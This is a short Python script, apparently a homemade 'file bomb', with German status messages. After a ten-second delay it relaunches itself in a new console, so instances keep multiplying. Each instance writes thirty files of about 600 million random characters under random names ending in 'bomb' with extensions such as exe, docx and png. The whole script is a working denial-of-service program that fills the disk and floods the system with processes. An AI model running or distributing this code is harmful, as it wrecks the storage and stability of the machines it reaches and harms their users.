import os
import string
import random
import asyncio
import sys
import time
import subprocess
time.sleep(10)
subprocess.Popen([sys.executable, sys.argv[0]], creationflags=subprocess.CREATE_NEW_CONSOLE, )
i = 1
let = ["F", "2", "1", "0"]
letters = "0"
extension = ["exe", "zip", "jpeg", "jpg", "png", "gif", "rar", "ini", "ctf", "py", "txt", "docx"]
start_time = time.time()
def writetofile(letters, extension):
    name = random.choice(string.ascii_letters) + random.choice(string.ascii_letters)
    ext = random.choice(extension)
    print(name + "bomb." + ext)
    filetw = open(name + "bomb." + ext, "w+")
    filetw.write(letters)
    filetw.close()
    print("File created successful.")

def write_random_lowercase(n):
    stime = time.time()
    min_lc = ord(b'a')
    len_lc = 8
    ba = bytearray(os.urandom(n))
    for i, b in enumerate(ba):
        ba[i] = min_lc + b % len_lc# convert 0..255 to 97..122
    print(str(n) + " Zeichen großer Data Array erstellt.")
    return ba

letters = write_random_lowercase(100000000)
letters = letters.decode("utf-8")
letters = letters + letters + letters + letters + letters + letters
for x in range(30):
    writetofile(letters,extension)
print('End')
print("--- %s seconds ---" % (time.time() - start_time))
exit()
